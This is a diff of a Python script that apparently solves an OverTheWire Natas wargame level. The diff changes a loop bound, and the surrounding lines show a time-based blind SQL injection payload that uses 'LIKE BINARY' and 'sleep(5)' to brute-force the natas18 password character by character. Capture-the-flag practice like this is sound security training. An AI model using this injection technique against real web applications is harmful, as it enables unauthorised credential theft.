@@ -28,7 +28,7 @@ print("Dictionary: {0}".format(''.join(password_dictionary)))
 print("[+] Now attempting to brute force...")
 password_list = []
 password = ''
-for i in range(1,35):
+for i in range(1,32):
     for char in password_dictionary:
         test = ''.join([password,char])
         uri = ''.join([url,'?','username=natas18"','+AND+password+LIKE+BINARY+%27',test,'%25%27+AND+sleep(5)+--+'])
